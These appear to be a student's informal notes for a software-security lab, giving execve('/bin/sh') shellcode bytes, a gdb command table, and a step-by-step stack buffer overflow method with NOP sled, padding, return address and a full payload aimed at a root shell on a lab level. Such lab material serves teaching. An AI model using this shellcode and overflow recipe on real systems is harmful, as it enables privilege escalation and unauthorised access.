## SSS Lab3 How2:

Shellcode: 
```
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
```
> TODO: Make shellcode which gives us root

`xxd -p -r shellcode > badfile`


| Command                              | Meaning                                                                                                                                                                                                                                                  |
| ------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `r`                                  | (re)run the program                                                                                                                                                                                                                                      |
| `q`                                  | quit gdb                                                                                                                                                                                                                                                 |
| `break <n>`               !          | breakpoint at line `n`                                                                                                                                                                                                                                   |
| `break *<n>`                         | breakpoint at memory address `n`                                                                                                                                                                                                                         |
| `c`                                  | continue past breakpoint                                                                                                                                                                                                                                 |
| `s [n]`                              | step `n`lines in the source                                                                                                                                                                                                                              |
| `si [n]`                             | step `n`machine instructions                                                                                                                                                                                                                             |
| `n [n]`                              | step `n`lines in the source of the current function, executing any function calls on the way                                                                                                                                                             |
| `ni [n]`                             | step `n`machine instructions in the current function, executing any function calls on the way                                                                                                                                                            |
| `info registers`                     | display current register values                                                                                                                                                                                                                          |
| `info frame`                         | apparently very very useful                                                                                                                                                                                                                              |
| `disassemble/mr <function>`          | disassemble a function (among other things you can then work out the exact layout of its stack frame)                                                                                                                                                    |
| `x/<n><t>[s] m` (e.g. `x/20xb $esp`) | dump memory: `n` = number of items to show, `t` = type (`x`=hex,`d`/`u`=signed/unsigned int, `c`=char, `a`=address, `s`=string), `s`=size (`b`=byte, `h`=halfword (2 bytes), `w`=word), `m` = memory location, or register pointing to a memory location |
| `print <expression>`                 | print the value of something                                                                                                                                                                                                                             |
| `display <expression>`               | print something every time you hit a breakpoint or step                                                                                                                                                                                                  |
| `l [n]`                              | (this is a lowercase L) list `n` lines of code, default 10                                                                                                                                                                                               |

pad As to find how much padding to overflow to eip (at end of bof func call)

1. Find padding amount to overflow to `eip`

2. Using `layout asm` `ni` `si` and `s` until after buffer created and `esp` is changed.

3. Take `&esp` (point here to execute shellcode)

GDB through using layout asm, ni (next instr) and si (step into) and s to get to after buffer created and esp changed - take esp address (want to point back hereto exc shellcode) - acc wanted edx (find pushed reg before strcpy
layut registers to view reg addresses
put new found address (flip if little endian) after padding after shellcode - 
use x/100xw $esp - N reg to find where shellcode is
if some erased replace padding with some 90s befire shell (Nops skip through)
decrease stack pointer so doesn't write shell - sub esp, 0x60 - add instruction use defuse.ca website
replace some 90s with added instr

p &buffer - print address of buffer *instead of finding esp change

0xbffff268 - 
0xbffff258 root

If no GDB -  writ c program to calculate offset between gdb and not gdb - then add offset into shellcode
``` c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buffer[256];

    printf("PID: %d\n", getpid());
    printf("Buffer address: %p\n", (void *)buffer); #only acc important one
    fflush(stdout);

    return 0;
}
```

compile: gcc

run gdb and not find diff in hex of address - apply diff to shellcode address
diff ox40 so -> a8
diff in stack root was 0x10  so 98



0x90 0x90 0x90 0x90 0x90 83 ec 60
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
61 61 61 61 61 61 61 61
61 61 61 61 bf ff f2 68


"$(cat /tmp/badfile)" - input file
 gdb --args /levels/level05 "$(cat /tmp/badfile)" - input file with gdb

exit - exit arb shell

lab3 cheat sheet